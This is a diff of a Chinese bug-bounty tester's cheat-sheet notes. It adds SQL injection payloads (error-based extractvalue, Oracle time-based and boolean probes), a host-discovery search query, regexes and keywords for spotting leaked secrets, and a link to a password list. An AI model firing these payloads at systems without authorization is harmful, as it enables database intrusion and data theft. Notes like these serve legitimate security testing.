@@ -16,11 +16,22 @@
 %'and substr('abc',1,1)='a' and'%'=' 
 '||exp(1)||'
 '||exp(99999)||'
-company_id=1'and/**/extrAcTvalue(1,concat(0x7e,database(),0x7e))/**/and'
+1'and/**/extrAcTvalue(1,concat(0x7e,database(),0x7e))/**/and'
+
+oracle
+'||(decode(length(user),6,dbms_pipe.receive_message('o',1)))||'
+'||(case when length(user)=2 then 1 else 3 end)||'
 ```
 
 ```yaml
 ip="202.xxx.0.0/19" && (status_code="200" || banner="HTTP/1.1 200 OK")
+```
+
+```plain
+\b((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b   ip正则
+^1[3-9]\d{9}$ 
+secret 
+PRIVATE
 ```
 
 [SRC必备密码.txt](https://www.yuque.com/attachments/yuque/0/2025/txt/26698826/1743401538118-59b980be-305d-4d5d-80de-555fe27d04a9.txt)
